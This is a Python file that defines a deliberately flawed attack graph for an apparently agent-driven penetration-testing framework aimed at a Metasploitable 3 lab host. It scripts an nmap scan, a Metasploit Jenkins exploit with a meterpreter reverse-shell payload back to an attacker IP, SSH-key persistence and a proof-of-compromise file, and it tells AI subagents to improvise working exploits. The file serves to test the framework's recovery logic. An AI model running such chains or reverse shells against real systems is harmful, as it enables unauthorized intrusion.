"""
Example Attack Graph: DELIBERATELY FLAWED chain (Metasploitable 3)

This graph is wrong on purpose, to exercise the system's recovery machinery:

  1. gain_access prescribes the WRONG exploit module — exploit/multi/http/
     jenkins_script_console against port 8484, which is CLOSED on this target.
     Direct execution will fail fast, which (in explore mode) triggers the new
     direct->subagent FALLBACK: the exploit stage subagent must improvise a real
     working vector against the discovered services.

  2. The privilege-escalation phase is DROPPED entirely (recon -> gain_access ->
     persist -> impact). This tests routing/recovery: can the chain cope without
     an escalation step, and/or does the judge/replanner notice it is missing?

  3. persist and impact are GOAL-ONLY (no module/commands), so they dispatch to
     their stage subagents.

Run with explore=True so the fallback + replanner are active.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_flawed_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target, establish persistence, "
                  "and drop a verified proof-of-compromise file. (This plan is "
                  "intentionally flawed: the prescribed initial-access exploit is "
                  "wrong and the privilege-escalation step is missing — the system "
                  "must recover.)",
        target_ip=target_ip,
        name=f"flawed_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Intentionally-flawed chain to test direct->subagent fallback + routing recovery.",
        metadata={"scenario": "flawed_recovery", "target_type": "metasploitable3"},
    )

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 100 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    # FLAW 1: wrong module — Jenkins on 8484 is CLOSED on this target.
    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (WRONG module on purpose)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a session on the target",
        objective=f"Gain an initial session on {target_ip}. (The prescribed "
                  f"module is wrong; if it fails, find a vector that actually "
                  f"works against the discovered services. LHOST={attacker_ip}.)",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/multi/http/jenkins_script_console",
        module_options={"RHOSTS": target_ip, "RPORT": 8484, "TARGETURI": "/"},
        payload="java/meterpreter/reverse_tcp",
        payload_options={"LHOST": attacker_ip, "LPORT": 4444},
        max_retries=4,
        tags=["initial_access", "flaw_wrong_module"],
    ))

    # FLAW 2: privesc phase intentionally omitted — persist follows gain_access.
    graph.add_node(AttackNode(
        id="persist",
        label="Establish Persistence",
        tactic=Tactic.PERSISTENCE.value,
        technique_id="T1098.004",
        technique_name="Account Manipulation: SSH Authorized Keys",
        agent_type="persistence",
        goal="Install a persistence mechanism via the session",
        objective="Establish a reliable persistence mechanism on the target via "
                  "the session and verify it is in place.",
        target_ip=target_ip,
        max_retries=3,
        tags=["persistence", "goal_only"],
    ))

    graph.add_node(AttackNode(
        id="impact",
        label="Proof-of-Compromise Impact",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate impact with a verified artifact",
        objective="Write a proof-of-compromise file to /tmp/pwned_flawed.txt via "
                  "the session, then read it back to verify the write succeeded.",
        target_ip=target_ip,
        max_retries=3,
        tags=["impact", "goal_only"],
    ))

    graph.connect(
        "recon", "gain_access",
        checks=[EdgeCheck(field="success", operator="equals", expected="True",
                          description="Recon produced usable service data")],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access against discovered services",
    )
    graph.connect(
        "gain_access", "persist",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="A session was opened")],
        evidence="Initial session established",
        rationale="Establish persistence on the session",
    )
    graph.connect(
        "persist", "impact",
        checks=[EdgeCheck(field="success", operator="equals", expected="True",
                          description="Persistence established")],
        evidence="Persistence in place",
        rationale="Demonstrate impact",
    )

    return graph


if __name__ == "__main__":
    graph = build_flawed_graph(target_ip="192.168.34.7", attacker_ip="192.168.34.6")
    print(graph.summary())
    out_path = "examples/flawed_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")
    loaded = AttackGraph.load(out_path)
    print(f"Reloaded: {loaded}  ready={loaded.ready_nodes()}")
